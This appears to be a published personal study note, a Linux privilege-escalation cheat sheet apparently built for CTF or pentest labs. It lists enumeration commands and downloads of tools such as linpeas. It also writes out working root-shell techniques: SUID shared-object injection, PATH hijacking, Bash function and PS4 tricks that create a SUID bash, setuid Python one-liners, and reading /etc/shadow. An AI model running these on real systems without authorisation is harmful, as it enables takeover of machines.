---
{"dg-publish":true,"permalink":"/notes/escalating-privileges-2/"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell

### Get a bash
```shell
script /dev/null -c bash
```
### exec bash like a sudo
```shell
sudo -u root /bin/bash
```
## System enumeration - Manual
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm 4000 2>/dev/null`                                                                                                                       | search files [[Operative System/Linux/Permisos/SUID\|SUID]]                                  |
| `find -a`<br>`-a \( -perm -u+s -o -perm -g+s \)`                                                                                                              | Combine conditions [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



| Option                          | Description                                                                                   |
| ------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -a`                    | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au` | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                    | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                    | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                   | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -i`                    | Shows interface statistics.                                                                   |
| `netstat -ano`                  | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |


</div></div>

## System enumeration - Automated
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


</div></div>

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
## SUID-SGID executables scaling
- https://gtfobins.github.io/
- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
Check files with SUID or SGID permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with SUID permision
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
Check files with SUID permision
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

|             |                      |
| ----------- | -------------------- |
| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Bash versions <4.2-048
- Define shell **functions** with **names** that **resemble** file paths
- - then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash <4.4
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Ver y cambiar capabilities
Como /usr está en modo lectura es necesario montarlo como escritura para poder editar las capabilities de este.
```shell
mount -o remount, rw /usr
setcap cap_net_admin,cap_net_raw+eip /usr/bin/wireshark
```

| Option                       | Description                          |
| ---------------------------- | ------------------------------------ |
| `getcap file`                | List capabilities simple             |
| `getcap -r / 2>/dev/null`    | List capabilities recursive from `/` |
| `setcap cap_setupid+ep file` | change                               |
| `setcap -r file`             | Remove                               |
## Lista de capabilities

Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementadas:

| Capability           | Description                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_SETUID           | Permite  manipulaciones arbitrarias de los IDs de usuario de los procesos (setuid(2), etc.); permite el uso  de  IDs  de  usuario falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                                        |
| CAP_SETGID           | Permite  manipulaciones arbitrarias de los IDs de grupo y de la lista de IDs de grupo adicionales de un proceso; permite el  uso de  IDs  de  grupo  falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                     |
| CAP_CHOWN            | Permite cambios arbitrarios en los IDs de usuario y de grupo de los ficheros (vea chown(2)).                                                                                                                                                                                                                                                                                                                                             |
| CAP_DAC_OVERRIDE     | Evita  las  comprobaciones de permisos sobre operaciones de lectura, escritura y ejecución.  (DAC = "control de acceso  discre-cional".)                                                                                                                                                                                                                                                                                                 |
| CAP_DAC_READ_SEARCH  | Evita comprobaciones de permisos sobre operaciones de lectura de ficheros y lectura y ejecución de directorios.                                                                                                                                                                                                                                                                                                                          |
| CAP_FOWNER           | Evita comprobaciones de permisos sobre operaciones  que  normalmente requieren que el ID de usuario del sistema de ficheros del proceso coincida  con  el  ID  de  usuario  del  fichero  (p.e., utime(2)),   excluyendo   aquellas   operaciones  cubiertas  por CAP_DAC_OVERRIDE y CAP_DAC_READ_SEARCH; ignora el  bit  pegajoso (sticky) en el borrado de ficheros.                                                                   |
| CAP_FSETID           | No  borra los bits set-user-ID y set-group-ID cuando se modifica un fichero; permite  establecer  el  bit  set-group-ID  para  un fichero  cuyo  ID  de  grupo  no  coincide con el del sistema de ficheros o cualquier otro ID  de  grupo  adicional  del  proceso invocador.                                                                                                                                                           |
| CAP_IPC_LOCK         | Permite  el  bloqueo  en  memoria  (mlock(2),  mlockall(2), shm-ctl(2)).                                                                                                                                                                                                                                                                                                                                                                 |
| CAP_IPC_OWNER        | Evita comprobaciones de  permisos  para  las  operaciones  sobre objetos System V IPC.                                                                                                                                                                                                                                                                                                                                                   |
| CAP_KILL             | Evita  comprobaciones  de  permisos  para  enviar  señales  (vea kill(2)).                                                                                                                                                                                                                                                                                                                                                               |
| CAP_LEASE            | (Linux 2.4 en adelante)  Permite que  se  establezcan  arriendos sobre ficheros arbitrarios (vea fcntl(2)).                                                                                                                                                                                                                                                                                                                              |
| CAP_LINUX_IMMUTABLE  | Permite  establecer  los  atributos  extendidos EXT2_APPEND_FL y EXT2_IMMUTABLE_FL sobre ficheros del sistema de ficheros ext2.                                                                                                                                                                                                                                                                                                          |
| CAP_MKNOD            | (Linux 2.4 en adelante) Permite la creación  de  ficheros  especiales usando mknod(2).                                                                                                                                                                                                                                                                                                                                                   |
| CAP_NET_ADMIN        | Permite   varias   operaciones  relacionadas  con  redes  (p.e., establecer opciones privilegiadas sobre conectores, habilitar la difusión  de paquetes multidestino (multicasting), configuración de interfaces, modificar tablas de encaminamiento).                                                                                                                                                                                   |
| CAP_NET_BIND_SERVICE | Permite ligar conectores a puertos  reservados  del  dominio  de Internet (números de puerto menores que 1024).                                                                                                                                                                                                                                                                                                                          |
| CAP_NET_BROADCAST    | (No  se  usa)  Permite  la  difusión universal (broadcasting) de paquetes a través de un conector y la escucha de paquetes multidestino.                                                                                                                                                                                                                                                                                                 |
| CAP_NET_RAW          | Permite el uso de conectores de tipo RAW y PACKET.                                                                                                                                                                                                                                                                                                                                                                                       |
| CAP_SETPCAP          | Concede o elimina cualquier capacidad en el conjunto de  capacidades permitidas del invocador a o desde cualquier otro proceso.                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_ADMIN        | Permite una variedad de operaciones de administración  del  sistema  incluyendo:  quotactl(2),  mount(2),  swapon(2),  sethostname(2), setdomainname(2), IPC_SET y operaciones IPC_RMID  sobre objetos  arbitrarios  IPC  de System V; permite el uso de IDs de usuario falsificados cuando se pasan credenciales de conectores.                                                                                                         |
| CAP_SYS_BOOT         | Permite llamadas a reboot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_CHROOT       | Permite llamadas a chroot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_MODULE       | Permite cargar y eliminar módulos del núcleo.                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_NICE         | Permite aumentar el valor nice del proceso  invocador  (nice(2), setpriority(2)) y cambiar el valor nice de procesos arbitrarios; permite establecer políticas de  planificación  de  tiempo  real para  el  proceso  invocador  y establecer políticas de planificación y prioridades para procesos arbitrarios  (sched_setscheduler(2), sched_setparam(2)).                                                                            |
| CAP_SYS_PACCT        | Permite llamadas a acct(2).                                                                                                                                                                                                                                                                                                                                                                                                              |
| CAP_SYS_PTRACE       | Permite  el seguimiento detallado de procesos arbitrarios usando ptrace(2)                                                                                                                                                                                                                                                                                                                                                               |
| CAP_SYS_RAWIO        | Permite operaciones sobre puertos de E/S (iopl(2) y ioperm(2)).                                                                                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_RESOURCE     | Permite el uso de espacio  reservado  en  sistemas  de  ficheros ext2;  llamadas  ioctl(2)  para  controlar  el registro en ext3; sobrescribir los límites de las cuotas de disco; incrementar los límites  de  recursos (vea setrlimit(2)); sobrescribir el límite del recurso RLIMIT_NPROC; incrementar el límite msg_qbytes para una  cola  de  mensajes  por encima del limite en /proc/sys/kernel/msgmnb (vea msgop(2) y msgctl(2). |
| CAP_SYS_TIME         | Permite la modificación del reloj del sistema  (settimeofday(2), adjtimex(2));  permite  la modificación del reloj de tiempo real (hardware)                                                                                                                                                                                                                                                                                             |
| CAP_SYS_TTY_CONFIG   | Permite llamadas a vhangup(2).                                                                                                                                                                                                                                                                                                                                                                                                           |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have [[Operative System/Linux/Permisos/SUID\|SUID]] binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example with `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we are imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

Check which folders can I write.

</div></div>

